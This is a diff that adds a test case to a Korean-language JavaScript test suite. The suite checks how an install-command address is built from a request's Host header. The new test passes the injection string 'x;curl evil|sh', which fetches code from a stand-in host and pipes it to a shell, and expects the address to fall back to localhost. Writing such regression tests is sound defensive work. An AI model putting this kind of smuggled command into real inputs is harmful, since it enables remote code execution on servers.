@@ -12,4 +12,9 @@ describe('성능 에이전트 설치 명령 주소', () => {
     expect(설치주소(undefined, 'http', 'localhost:3000')).toBe('http://localhost:3000');
     expect(설치주소('', 'http', undefined)).toBe('http://localhost');
   });
+
+  it('요청의 Host 에 주소 글자가 아닌 것이 섞이면 셸 명령에 넣지 않고 localhost 로 둔다', () => {
+    expect(설치주소(undefined, 'http', 'x;curl evil|sh')).toBe('http://localhost');
+    expect(설치주소(undefined, 'http', '[::1]:3000')).toBe('http://[::1]:3000');
+  });
 });
